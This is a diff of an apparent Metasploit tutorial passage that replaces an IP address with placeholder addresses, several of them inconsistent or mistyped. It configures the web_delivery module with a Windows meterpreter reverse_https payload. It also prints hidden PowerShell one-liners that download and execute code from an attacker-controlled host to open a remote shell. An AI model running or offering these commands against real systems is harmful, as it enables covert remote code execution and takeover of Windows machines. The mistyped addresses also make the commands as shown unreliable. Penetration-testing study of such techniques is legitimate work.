@@ -21,29 +21,29 @@ msf exploit(web_delivery) > set target 2
 target => 2
 msf exploit(web_delivery) > set payload windows/x64/meterpreter/reverse_https
 payload => windows/x64/meterpreter/reverse_https
-msf exploit(web_delivery) > set lhost 14.97.131.138
+msf exploit(web_delivery) > set lhost 10.10.10.10
 lhost => 14.97.131.138
 msf exploit(web_delivery) > run
 [*] Exploit running as background job.
 
-[*] Started HTTPS reverse handler on https://14.97.131.138:8443
+[*] Started HTTPS reverse handler on https://10.10.10.10.:8443
 msf exploit(web_delivery) > [*] Using URL: http://0.0.0.0:8080/uMOKs6wtlYL
-[*] Local IP: http://14.97.131.138:8080/uMOKs6wtlYL
+[*] Local IP: http://10.10.10.10:8080/uMOKs6wtlYL
 [*] Server started.
 [*] Run the following command on the target machine:
-powershell.exe -nop -w hidden -c $X=new-object net.webclient;$X.proxy=[Net.WebRequest]::GetSystemWebProxy();$X.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');
+powershell.exe -nop -w hidden -c $X=new-object net.webclient;$X.proxy=[Net.WebRequest]::GetSystemWebProxy();$X.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $X.downloadstring('http://10.10.10.10:8080/uMOKs6wtlYL');
 ```
 
 When the following command \(when there is no proxy\)
 
 ```
-powershell.exe -nop -w hidden -c $X=new-object net.webclient;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');
+powershell.exe -nop -w hidden -c $X=new-object net.webclient;IEX $X.downloadstring('http://10.10.10.108:8080/uMOKs6wtlYL');
 ```
 
 or \(when there is proxy\)
 
 ```
-powershell.exe -nop -w hidden -c $X=new-object net.webclient;$X.proxy=[Net.WebRequest]::GetSystemWebProxy();$X.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');
+powershell.exe -nop -w hidden -c $X=new-object net.webclient;$X.proxy=[Net.WebRequest]::GetSystemWebProxy();$X.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $X.downloadstring('http://10.10.10.10:8080/uMOKs6wtlYL');
 ```
 
 is executed on the windows remote machine, we should get a meterpreter.
